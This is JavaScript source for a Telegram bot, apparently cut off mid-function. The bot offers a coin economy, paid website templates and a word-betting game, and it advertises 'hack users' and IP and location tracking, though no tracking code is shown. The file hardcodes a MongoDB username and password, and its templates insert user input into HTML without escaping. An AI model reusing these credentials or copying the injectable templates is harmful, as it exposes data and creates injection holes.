// =====================================================
// 🎮🔥 SLIME TRACKERX v20.0 - ULTIMATE GOD EDITION 🔥🎮
// 🌐 WEB CREATOR (15 COINS ONLY!) | ADMIN MENU | HACK SYSTEM
// 📝 1v1 WORD BATTLE | PVP | EVERYTHING! 💀
// =====================================================
// 👑 Dev: @Mrddev | 📢 Updates: @devxtechzone
// 🏆 CREATE STUNNING WEBSITES FOR JUST 15 COINS!
// 💀 HACK USERS | TRACK IP/LOCATION | PVP BATTLES
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const archiver = require("archiver");
const multer = require("multer");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== FILE UPLOAD SETUP ==========
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/')
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + '-' + file.originalname)
  }
});
const upload = multer({ storage: storage, limits: { fileSize: 10 * 1024 * 1024 } });

// ========== SETUP ==========
app.use(bodyParser.json({ limit: "100mb" }));
app.use(express.static(path.join(__dirname, "public")));
app.use("/websites", express.static(path.join(__dirname, "websites")));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

fs.ensureDirSync(path.join(__dirname, "websites"));
fs.ensureDirSync(path.join(__dirname, "uploads"));
fs.ensureDirSync(path.join(__dirname, "public"));

// ========== MONGODB CONNECTION ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected!'))
  .catch(err => console.log('❌ MongoDB Error:', err));

// ========== ENHANCED SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true, required: true },
  joinDate: { type: Date, default: Date.now },
  lastActive: Date,
  coins: { type: Number, default: 10 },
  diamonds: { type: Number, default: 0 },
  totalEarned: { type: Number, default: 10 },
  totalSpent: { type: Number, default: 0 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  hacks: { type: Number, default: 0 },
  hackedUsers: { type: [Number], default: [] },
  level: { type: Number, default: 1 },
  xp: { type: Number, default: 0 },
  streak: { type: Number, default: 0 },
  lastDaily: Date,
  games: { type: Number, default: 0 },
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  badges: { type: [String], default: ["🎁 New User"] },
  wordWins: { type: Number, default: 0 },
  wordLosses: { type: Number, default: 0 },
  totalEarnedFromWords: { type: Number, default: 0 },
  websites: { type: [Object], default: [] },
  isAdmin: { type: Boolean, default: false }
});

const codeSchema = new mongoose.Schema({
  code: { type: String, unique: true, required: true },
  coins: Number,
  diamonds: { type: Number, default: 0 },
  usedBy: [Number],
  maxUses: { type: Number, default: 20 },
  left: Number,
  expire: Date,
  createdAt: { type: Date, default: Date.now }
});

const websiteSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  template: String,
  content: Object,
  images: [String],
  url: String,
  views: { type: Number, default: 0 },
  likes: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Code = mongoose.model('Code', codeSchema);
const Website = mongoose.model('Website', websiteSchema);

// ========== CONFIG ==========
const DOMAIN = process.env.DOMAIN || "https://virtualnumbersfree.onrender.com";
const CHANNEL = process.env.CHANNEL || "@devxtechzone";
const OWNER_ID = parseInt(process.env.OWNER_ID) || 6170894121;

// ========== ECONOMY ==========
const TRACK_COST = 10;
const NEW_COINS = 10;
const REF_REWARD = 8;
const DAILY_REWARD = 3;
const WORK_REWARD = 1;
const WORK_CD = 12 * 60 * 60 * 1000;
const WORD_MIN_BET = 5;
const WORD_MAX_BET = 500;
const WEB_PRICE = 15;

// ========== DIFFICULTY LEVELS ==========
const difficultyLevels = {
  "easy": { name: "🍃 EASY", timer: 45, multiplier: 0.8, color: "🟢", letters: "3-4" },
  "medium": { name: "⚡ MEDIUM", timer: 30, multiplier: 1.0, color: "🟡", letters: "5-6" },
  "hard": { name: "🔥 HARD", timer: 15, multiplier: 1.5, color: "🟠", letters: "7-8" },
  "expert": { name: "💀 EXPERT", timer: 8, multiplier: 2.0, color: "🔴", letters: "9+" }
};

// ========== COMPLETE WORD DATABASE ==========
const wordsByLength = {
  3: ["CAT", "DOG", "SUN", "CAR", "BAG", "HAT", "LEG", "EYE", "CUP", "BED", "RED", "HOT", "COLD", "BIG", "NEW", "OLD", "GOOD", "BAD", "FUN", "RUN", "SIT", "WALK", "EAT", "FLY", "CRY", "JOY", "SAD", "WET", "DRY", "FAT", "THIN"],
  4: ["FISH", "BIRD", "FROG", "STAR", "MOON", "TREE", "HOUSE", "APPLE", "MANGO", "HAPPY", "SMART", "BRAIN", "HEART", "SOUND", "LIGHT", "DARK", "BLACK", "WHITE", "GREEN", "BLUE", "PINK", "BROWN", "WATER", "FIRE", "EARTH", "WIND"],
  5: ["APPLE", "MANGO", "GRAPE", "BERRY", "PEACH", "LEMON", "MELON", "HOUSE", "HAPPY", "SMART", "BRAIN", "HEART", "SOUND", "LIGHT", "DARK", "BLACK", "WHITE", "GREEN", "YELLOW", "PURPLE", "ORANGE", "CLOUD", "STORM", "MONEY", "POWER"],
  6: ["BANANA", "ORANGE", "PURPLE", "YELLOW", "SILVER", "GOLDEN", "RABBIT", "TIGER", "EAGLE", "SHARK", "WHALE", "ZEBRA", "SNAKE", "WOLF", "BEAR", "FOX", "LION", "MOUSE", "HORSE", "COW", "SHEEP", "GOAT"],
  7: ["BANANA", "ORANGE", "PURPLE", "YELLOW", "SILVER", "GOLDEN", "RABBIT", "TIGER", "EAGLE", "SHARK", "WHALE", "ZEBRA", "SNAKE", "WOLF", "BEAR", "FOX", "LION", "MOUSE", "HORSE", "COW", "SHEEP", "GOAT"],
  8: ["ELEPHANT", "GIRAFFE", "KANGAROO", "DOLPHIN", "PENGUIN", "BUTTERFLY", "DRAGON", "PHOENIX", "COMPUTER", "KEYBOARD", "MONITOR", "BEAUTIFUL", "WONDERFUL", "EXCITING", "ADVENTURE"],
  9: ["EXTRAORDINARY", "UNBELIEVABLE", "INCREDIBLE", "RESPONSIBILITY", "CHARACTERISTIC", "UNDERSTANDING", "ACCOMMODATION", "INTERNATIONAL", "ENTREPRENEUR", "CONGRATULATIONS"]
};

function getRandomWordByLength(length) {
  let words = wordsByLength[length] || wordsByLength[5];
  return words[Math.floor(Math.random() * words.length)];
}

// ========== MEMORY CACHE ==========
let usersCache = new Map();
let codesCache = new Map();
let tokens = new Map();
let workCD = new Map();
let tagCD = new Map();
let warns = new Map();
let antiLink = new Set();
let antiSpam = new Set();
let spamTrack = new Map();
let welcome = new Map();
let goodbye = new Map();
let bannedUsers = new Set();
let activeChats = new Map();
let gameSessions = new Map();
let afk = new Map();
let notes = new Map();
let processedMessages = new Set();
let wordChallenges = new Map();
let webBuilds = new Map();

// ========== LOAD DATA ==========
async function loadData() {
  try {
    const allUsers = await User.find({});
    for (const user of allUsers) {
      usersCache.set(user.userId, user);
    }
    console.log(`📂 Loaded ${usersCache.size} users`);
    
    const allCodes = await Code.find({ expire: { $gt: new Date() } });
    for (const code of allCodes) {
      codesCache.set(code.code, code);
    }
    console.log(`📂 Loaded ${codesCache.size} active codes`);
  } catch(e) {
    console.log("Error loading data:", e);
  }
}

async function saveUser(userId, data) {
  try {
    await User.findOneAndUpdate({ userId: userId }, data, { upsert: true });
    usersCache.set(userId, data);
  } catch(e) {
    console.log("Error saving user:", e);
  }
}

async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  
  if (!user) {
    user = {
      userId: userId,
      joinDate: new Date(),
      lastActive: new Date(),
      coins: NEW_COINS,
      diamonds: 0,
      totalEarned: NEW_COINS,
      totalSpent: 0,
      referrals: 0,
      referrer: referrerId,
      hacks: 0,
      hackedUsers: [],
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      games: 0,
      wins: 0,
      losses: 0,
      badges: ["🎁 New User"],
      wordWins: 0,
      wordLosses: 0,
      totalEarnedFromWords: 0,
      websites: [],
      isAdmin: userId === OWNER_ID
    };
    await saveUser(userId, user);
    
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals += 1;
        referrer.totalEarned += REF_REWARD;
        if (!referrer.badges.includes("🌟 Recruiter")) {
          referrer.badges.push("🌟 Recruiter");
        }
        await saveUser(referrerId, referrer);
        bot.telegram.sendMessage(referrerId, `🎉 NEW REFERRAL! +${REF_REWARD} COINS\n💰 ${referrer.coins} coins | 👥 ${referrer.referrals} refs`);
      }
    }
  }
  return user;
}

async function addCoin(userId, amt) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amt;
    user.totalEarned += amt;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function takeCoin(userId, amt) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amt) {
    user.coins -= amt;
    user.totalSpent += amt;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function canHack(userId) {
  let user = usersCache.get(userId);
  return user && user.coins >= TRACK_COST;
}

async function useHack(userId) {
  let user = usersCache.get(userId);
  if (user && user.coins >= TRACK_COST) {
    user.coins -= TRACK_COST;
    user.hacks += 1;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function addXP(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.xp += amount;
    let needed = user.level * 100;
    if (user.xp >= needed) {
      user.xp -= needed;
      user.level += 1;
      let reward = user.level * 3;
      user.coins += reward;
      await saveUser(userId, user);
      bot.telegram.sendMessage(userId, `🎉 LEVEL UP! Level ${user.level}! +${reward} COINS`);
    } else {
      await saveUser(userId, user);
    }
    return true;
  }
  return false;
}

async function getUsername(userId) {
  try {
    let chat = await bot.telegram.getChat(userId);
    return chat.username || `User_${userId}`;
  } catch {
    return `User_${userId}`;
  }
}

function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'trackersxbot'}?start=ref_${id}`;
}

// ========== REDEEM CODE SYSTEM ==========
async function genCode(coins, diamonds = 0, uses = 20, hours = 24) {
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  let expire = new Date(Date.now() + (hours * 3600000));
  
  let codeData = new Code({
    code: code,
    coins: coins,
    diamonds: diamonds,
    usedBy: [],
    maxUses: Math.min(uses, 20),
    left: Math.min(uses, 20),
    expire: expire
  });
  
  await codeData.save();
  codesCache.set(code, codeData);
  return code;
}

async function redeemCode(userId, code) {
  try {
    let c = codesCache.get(code.toUpperCase());
    
    if (!c) {
      c = await Code.findOne({ code: code.toUpperCase(), expire: { $gt: new Date() } });
      if (!c) return { ok: false, msg: "❌ Invalid code!" };
    }
    
    if (Date.now() > c.expire) {
      codesCache.delete(code);
      return { ok: false, msg: "❌ Code expired!" };
    }
    
    if (c.left <= 0) {
      return { ok: false, msg: "❌ Code already used up!" };
    }
    
    if (c.usedBy.includes(userId)) {
      return { ok: false, msg: "❌ You already used this code!" };
    }
    
    await addCoin(userId, c.coins);
    if (c.diamonds > 0) {
      let user = usersCache.get(userId);
      user.diamonds += c.diamonds;
      await saveUser(userId, user);
    }
    
    c.usedBy.push(userId);
    c.left -= 1;
    await c.save();
    codesCache.set(c.code, c);
    
    let user = usersCache.get(userId);
    return { ok: true, msg: `✅ Redeemed ${c.coins} coins!${c.diamonds > 0 ? ` +${c.diamonds}💎` : ''}`, coins: c.coins, newBalance: user.coins };
    
  } catch(e) {
    console.error("Redeem error:", e);
    return { ok: false, msg: "❌ Error redeeming code!" };
  }
}

// ========== JOIN CHECK ==========
async function checkJoin(ctx) {
  try {
    let m = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    return ["creator", "administrator", "member"].includes(m.status);
  } catch {
    return false;
  }
}

// ========== HTML TEMPLATES ==========
const htmlTemplates = {
  portfolio: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.name || 'Portfolio'} | Portfolio</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; line-height: 1.6; }
        .container { max-width: 1200px; margin: auto; padding: 20px; }
        .hero { text-align: center; padding: 100px 20px; background: rgba(0,0,0,0.3); border-radius: 30px; margin: 20px 0; }
        .hero h1 { font-size: 4rem; margin-bottom: 20px; }
        .section { background: rgba(255,255,255,0.1); border-radius: 20px; padding: 40px; margin: 30px 0; backdrop-filter: blur(10px); }
        .skills { display: flex; flex-wrap: wrap; gap: 15px; margin-top: 20px; }
        .skill { background: rgba(255,255,255,0.2); padding: 10px 25px; border-radius: 30px; }
        .projects { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 25px; margin-top: 30px; }
        .project { background: rgba(255,255,255,0.1); border-radius: 15px; padding: 25px; transition: transform 0.3s; }
        .project:hover { transform: translateY(-5px); background: rgba(255,255,255,0.2); }
        .btn { background: white; color: #667eea; border: none; padding: 12px 35px; border-radius: 30px; cursor: pointer; font-weight: bold; margin-top: 20px; }
        footer { text-align: center; padding: 40px; opacity: 0.8; }
        @media (max-width: 768px) { .hero h1 { font-size: 2rem; } .projects { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="hero"><h1>${data.name || 'Welcome'}</h1><p>${data.title || 'Creative Professional'}</p><button class="btn" onclick="location.href='mailto:${data.email || ''}'">📧 Contact Me</button></div>
        <div class="section"><h2>✨ About Me</h2><p>${data.bio || 'Passionate creator dedicated to excellence.'}</p><div class="skills"><span class="skill">${data.skill1 || 'Creative'}</span><span class="skill">${data.skill2 || 'Innovative'}</span><span class="skill">${data.skill3 || 'Professional'}</span></div></div>
        <div class="section"><h2>🚀 Featured Projects</h2><div class="projects"><div class="project"><h3>${data.project1 || 'Project Alpha'}</h3><p>${data.project1_desc || 'An innovative solution.'}</p></div><div class="project"><h3>${data.project2 || 'Project Beta'}</h3><p>${data.project2_desc || 'Pushing boundaries.'}</p></div></div></div>
        <footer><p>© 2024 ${data.name || 'Portfolio'} | ${data.email || ''}</p><p>🔥 Created with Slime TrackerX Web Builder</p></footer>
    </div>
</body>
</html>`,
  business: (data) => `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.company || 'Business'} | Official</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Inter',sans-serif;background:#f8f9fa;color:#333;}.navbar{background:#1a1a2e;color:white;padding:20px 40px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;}.logo{font-size:28px;font-weight:bold;background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}.hero{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;text-align:center;padding:120px 20px;}.hero h1{font-size:3.5rem;margin-bottom:20px;}.container{max-width:1200px;margin:auto;padding:60px 20px;}.services{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:30px;margin:40px 0;}.service{background:white;border-radius:15px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,0.1);text-align:center;transition:transform 0.3s;}.service:hover{transform:translateY(-10px);}.service h3{color:#667eea;margin-bottom:15px;}.contact{background:#1a1a2e;color:white;text-align:center;padding:80px 20px;}.btn{background:#667eea;color:white;border:none;padding:15px 40px;border-radius:30px;cursor:pointer;font-weight:bold;}footer{text-align:center;padding:30px;background:#1a1a2e;color:white;}@media(max-width:768px){.navbar{flex-direction:column;gap:15px;}.hero h1{font-size:2rem;}.services{grid-template-columns:1fr;}}</style></head>
<body><div class="navbar"><div class="logo">${data.company || 'Business'}</div></div><div class="hero"><h1>${data.company || 'Welcome'}</h1><p>${data.tagline || 'Excellence in Service'}</p><button class="btn" onclick="location.href='#contact'">Get Started</button></div><div class="container"><h2 style="text-align:center;">💼 Our Services</h2><div class="services"><div class="service"><h3>${data.service1 || 'Service One'}</h3><p>${data.service1_desc || 'High-quality service.'}</p></div><div class="service"><h3>${data.service2 || 'Service Two'}</h3><p>${data.service2_desc || 'Innovative solutions.'}</p></div><div class="service"><h3>${data.service3 || 'Service Three'}</h3><p>${data.service3_desc || 'Reliable support.'}</p></div></div></div><div class="contact" id="contact"><h2>📞 Contact Us</h2><p>📧 ${data.email || 'info@example.com'}</p><p>📞 ${data.phone || '+1 234 567 8900'}</p><p>📍 ${data.address || '123 Business Street'}</p><button class="btn" onclick="alert('Thank you! We will contact you soon.')">Send Message</button></div><footer><p>© 2024 ${data.company || 'Business'}</p><p>🔥 Created with Slime TrackerX Web Builder</p></footer></body></html>`,
  store: (data) => `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.store || 'Store'} | Shop</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Inter',sans-serif;background:#f5f5f5;color:#333;}.navbar{background:white;padding:20px 40px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;box-shadow:0 2px 10px rgba(0,0,0,0.1);}.logo{font-size:28px;font-weight:bold;color:#667eea;}.hero{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;text-align:center;padding:80px 20px;}.hero h1{font-size:3rem;margin-bottom:20px;}.products{max-width:1200px;margin:60px auto;padding:0 20px;display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:30px;}.product{background:white;border-radius:15px;padding:25px;text-align:center;transition:transform 0.3s;box-shadow:0 5px 20px rgba(0,0,0,0.1);}.product:hover{transform:translateY(-10px);}.price{font-size:24px;font-weight:bold;color:#667eea;margin:10px 0;}.buy-btn{background:#667eea;color:white;border:none;padding:12px 30px;border-radius:25px;cursor:pointer;width:100%;font-weight:bold;}footer{background:#1a1a2e;color:white;text-align:center;padding:40px;margin-top:60px;}@media(max-width:768px){.navbar{flex-direction:column;gap:15px;}.hero h1{font-size:2rem;}.products{grid-template-columns:1fr;}}</style></head>
<body><div class="navbar"><div class="logo">🛒 ${data.store || 'Store'}</div></div><div class="hero"><h1>${data.store || 'Welcome to Our Store'}</h1><p>${data.tagline || 'Premium quality products'}</p></div><div class="products"><div class="product"><h3>${data.product1 || 'Product 1'}</h3><div class="price">$${data.product1_price || '49'}</div><p>${data.product1_desc || 'High quality product'}</p><button class="buy-btn" onclick="alert('Contact ${data.email || ''} to order!')">Buy Now</button></div><div class="product"><h3>${data.product2 || 'Product 2'}</h3><div class="price">$${data.product2_price || '79'}</div><p>${data.product2_desc || 'Premium quality'}</p><button class="buy-btn" onclick="alert('Contact ${data.email || ''} to order!')">Buy Now</button></div><div class="product"><h3>${data.product3 || 'Product 3'}</h3><div class="price">$${data.product3_price || '99'}</div><p>${data.product3_desc || 'Best seller!'}</p><button class="buy-btn" onclick="alert('Contact ${data.email || ''} to order!')">Buy Now</button></div></div><footer><p>📧 ${data.email || 'store@example.com'}</p><p>🔥 Created with Slime TrackerX Web Builder</p></footer></body></html>`,
  gaming: (data) => `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.gamertag || 'Gamer'} | Gaming Hub</title><style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#0a0a0a;color:#0f0;font-family:'Courier New',monospace;}.glitch{animation:glitch 3s infinite;}@keyframes glitch{0%,100%{text-shadow:2px 0 red,-2px 0 blue;}50%{text-shadow:-2px 0 red,2px 0 blue;}}.navbar{background:rgba(0,0,0,0.95);padding:20px;border-bottom:2px solid #0f0;text-align:center;font-size:24px;font-weight:bold;}.hero{height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;background:linear-gradient(45deg,#0a0a0a,#1a1a1a);}.hero h1{font-size:4rem;margin-bottom:20px;}.btn{background:#0f0;color:#000;padding:15px 40px;border:none;cursor:pointer;font-weight:bold;margin:10px;transition:0.3s;}.btn:hover{transform:scale(1.1);box-shadow:0 0 20px #0f0;}.games{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px;padding:60px 40px;max-width:1200px;margin:auto;}.game-card{background:#1a1a1a;border:1px solid #0f0;border-radius:10px;padding:30px;text-align:center;transition:0.3s;}.game-card:hover{transform:scale(1.05);box-shadow:0 0 20px #0f0;}footer{text-align:center;padding:40px;border-top:1px solid #0f0;}@media(max-width:768px){.hero h1{font-size:2rem;}.games{padding:20px;}}</style></head>
<body><div class="navbar">🎮 ${data.gamertag || 'GAMING HUB'} 🔥</div><div class="hero"><div><h1 class="glitch">${data.gamertag || 'GAMER'}</h1><p>${data.tagline || 'Level Up Your Game'}</p><button class="btn" onclick="alert('Follow on Twitch: ${data.twitch || 'twitch.tv/gamer'}')">Watch Live</button></div></div><div class="games"><div class="game-card"><h3>🎮 ${data.game1 || 'Game 1'}</h3><p>Master Rank</p></div><div class="game-card"><h3>⚔️ ${data.game2 || 'Game 2'}</h3><p>Top 500</p></div><div class="game-card"><h3>🏆 ${data.game3 || 'Game 3'}</h3><p>Champion</p></div></div><footer><p>🎮 ${data.gamertag || 'Gamer'} | 🔥 Created with Slime TrackerX Web Builder</p></footer></body></html>`,
  restaurant: (data) => `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.restaurant || 'Restaurant'} | Menu</title><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Georgia',serif;background:#fff8f0;}.header{background:#8B4513;color:white;text-align:center;padding:60px 20px;}.header h1{font-size:3rem;}.menu{max-width:800px;margin:60px auto;padding:0 20px;}.category{margin:40px 0;}.category h2{color:#8B4513;border-bottom:2px solid #8B4513;padding-bottom:10px;margin-bottom:20px;}.item{display:flex;justify-content:space-between;padding:15px;border-bottom:1px dashed #ddd;}.item-name{font-weight:bold;}.item-price{color:#8B4513;font-weight:bold;}.specials{background:#ffe4b5;padding:30px;border-radius:15px;margin:40px 0;text-align:center;}footer{background:#333;color:white;text-align:center;padding:40px;margin-top:60px;}@media(max-width:600px){.item{flex-direction:column;}.header h1{font-size:2rem;}}</style></head>
<body><div class="header"><h1>🍽️ ${data.restaurant || 'Restaurant'}</h1><p>${data.cuisine || 'Fine Dining'} | ${data.hours || '11AM - 10PM'}</p></div><div class="menu"><div class="specials"><h3>🍕 Today's Special</h3><p>${data.special || 'Chef\'s Special - 20% OFF'}</p></div><div class="category"><h2>Appetizers</h2><div class="item"><span class="item-name">${data.app1 || 'Bruschetta'}</span><span class="item-price">$${data.app1_price || '8'}</span></div><div class="item"><span class="item-name">${data.app2 || 'Calamari'}</span><span class="item-price">$${data.app2_price || '12'}</span></div></div><div class="category"><h2>Main Course</h2><div class="item"><span class="item-name">${data.main1 || 'Grilled Salmon'}</span><span class="item-price">$${data.main1_price || '24'}</span></div><div class="item"><span class="item-name">${data.main2 || 'Steak'}</span><span class="item-price">$${data.main2_price || '32'}</span></div></div><div class="category"><h2>Desserts</h2><div class="item"><span class="item-name">${data.dessert1 || 'Tiramisu'}</span><span class="item-price">$${data.dessert1_price || '7'}</span></div></div></div><footer><p>📍 ${data.address || '123 Food Street'}</p><p>📞 ${data.phone || '+1 234 567 8900'} | 📧 ${data.email || 'info@restaurant.com'}</p><p>🔥 Created with Slime TrackerX Web Builder</p></footer></body></html>`
};

// ========== WEB CREATOR COMMANDS ==========
bot.command("web", async (ctx) => {
  let message = "🌐 **DOPE WEB CREATOR** 🌐\n\nCreate stunning websites for just **15 COINS**!\n\n**Available Templates:**\n• portfolio - Modern Portfolio\n• business - Corporate Business\n• store - E-Commerce Store\n• gaming - Gaming Hub\n• restaurant - Restaurant Menu\n\n**Commands:**\n/createweb [template] - Create a website (15 coins)\n/mywebsites - View your websites\n\n**Example:** /createweb portfolio";
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("createweb", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let template = args[1];
  let u = await initUser(ctx.from.id);
  
  const templates = ["portfolio", "business", "store", "gaming", "restaurant"];
  const questions = {
    portfolio: ["name", "title", "bio", "email", "skill1", "skill2", "skill3", "project1", "project1_desc", "project2", "project2_desc"],
    business: ["company", "tagline", "service1", "service1_desc", "service2", "service2_desc", "service3", "service3_desc", "email", "phone", "address"],
    store: ["store", "tagline", "product1", "product1_price", "product1_desc", "product2", "product2_price", "product2_desc", "product3", "product3_price", "product3_desc", "email"],
    gaming: ["gamertag", "tagline", "game1", "game2", "game3", "twitch", "youtube"],
    restaurant: ["restaurant", "cuisine", "hours", "special", "app1", "app1_price", "app2", "app2_price", "main1", "main1_price", "main2", "main2_price", "dessert1", "dessert1_price", "address", "phone", "email"]
  };
  
  if (!template || !templates.includes(template)) return ctx.reply("❌ Templates: portfolio, business, store, gaming, restaurant");
  if (u.coins < WEB_PRICE) return ctx.reply(`❌ Need ${WEB_PRICE} coins! You have ${u.coins}`);
  
  await takeCoin(ctx.from.id, WEB_PRICE);
  webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
  await ctx.reply(`✅ Selected: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Send me your ${questions[template][0]}:`);
});

bot.command("mywebsites", async (ctx) => {
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) return ctx.reply("📭 No websites yet! Use /createweb [template]");
  let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
  for (let site of websites) message += `• ${site.name}\n  🔗 ${site.url}\n  👁️ ${site.views} views\n\n`;
  await ctx.reply(message);
});

// ========== 1v1 WORD CHALLENGE ==========
bot.command("wordbattle", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) {
    return ctx.reply(`📝 **1v1 WORD CHALLENGE**

Challenge a friend to spell words!

**Usage:** /wordbattle @username [amount] [difficulty]

**Difficulties:**
🍃 easy - 45 seconds (3-4 letters)
⚡ medium - 30 seconds (5-6 letters)
🔥 hard - 15 seconds (7-8 letters)
💀 expert - 8 seconds (9+ letters)

💰 Winner takes ALL coins!`, { parse_mode: "Markdown" });
  }
  
  let targetUsername = args[1];
  let betAmount = parseInt(args[2]);
  let difficulty = args[3].toLowerCase();
  
  if (!difficultyLevels[difficulty]) return ctx.reply("❌ Invalid difficulty! Use: easy, medium, hard, expert");
  if (isNaN(betAmount) || betAmount < WORD_MIN_BET) return ctx.reply(`❌ Minimum bet is ${WORD_MIN_BET} coins!`);
  if (betAmount > WORD_MAX_BET) return ctx.reply(`❌ Maximum bet is ${WORD_MAX_BET} coins!`);
  
  let targetId = null;
  for (let [id, u] of usersCache) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === targetUsername.replace("@", "")) { targetId = id; break; }
    } catch(e) {}
  }
  if (!targetId) return ctx.reply("❌ User not found!");
  if (targetId === ctx.from.id) return ctx.reply("❌ Cannot battle yourself!");
  
  let user = await initUser(ctx.from.id);
  if (user.coins < betAmount) return ctx.reply(`❌ You need ${betAmount} coins to bet!`);
  
  let diff = difficultyLevels[difficulty];
  let letterCount = difficulty === "easy" ? (Math.random() < 0.5 ? 3 : 4) : difficulty === "medium" ? (Math.random() < 0.5 ? 5 : 6) : difficulty === "hard" ? (Math.random() < 0.5 ? 7 : 8) : 9;
  let targetWord = getRandomWordByLength(letterCount);
  
  wordChallenges.set(targetId, { from: ctx.from.id, fromUsername: ctx.from.username || ctx.from.first_name, bet: betAmount, difficulty, letterCount, targetWord, time: Date.now(), status: "waiting" });
  setTimeout(() => { let challenge = wordChallenges.get(targetId); if (challenge && challenge.status === "waiting") wordChallenges.delete(targetId); }, 60000);
  
  await ctx.reply(`✅ Word challenge sent to ${targetUsername}!\n💰 Bet: ${betAmount} coins\n${diff.color} Difficulty: ${diff.name}\n📏 Need a ${letterCount}-letter word\n⏱️ ${diff.timer} seconds timer`);
  await ctx.telegram.sendMessage(targetId, `📝 **WORD CHALLENGE!** 📝\n\n@${ctx.from.username || ctx.from.first_name} challenges you!\n💰 Bet: ${betAmount} coins\n${diff.color} Difficulty: ${diff.name}\n📏 Need a **${letterCount}-letter word**\n⏱️ Timer: ${diff.timer} seconds\n\nType /acceptword to accept!`);
});

bot.command("acceptword", async (ctx) => {
  let challenge = wordChallenges.get(ctx.from.id);
  if (!challenge) return ctx.reply("❌ No word challenge found!");
  if (challenge.status !== "waiting") return ctx.reply("❌ Challenge already accepted!");
  
  let accepter = await initUser(ctx.from.id);
  if (accepter.coins < challenge.bet) return ctx.reply(`❌ You need ${challenge.bet} coins to accept!`);
  
  await takeCoin(challenge.from, challenge.bet);
  await takeCoin(ctx.from.id, challenge.bet);
  
  let diff = difficultyLevels[challenge.difficulty];
  challenge.status = "active";
  challenge.currentTurn = "challenger";
  challenge.startTime = Date.now();
  wordChallenges.set(ctx.from.id, challenge);
  
  await ctx.telegram.sendMessage(challenge.from, `📝 **YOUR TURN!** 📝\n\nGive me a **${challenge.letterCount}-letter word**\n\nExample: ${challenge.targetWord}\n\n⏱️ You have ${diff.timer} seconds!\n💰 Total pot: ${challenge.bet * 2} coins`);
  
  setTimeout(async () => {
    let game = wordChallenges.get(ctx.from.id);
    if (game && game.status === "active" && game.currentTurn === "challenger") {
      game.status = "completed";
      wordChallenges.delete(ctx.from.id);
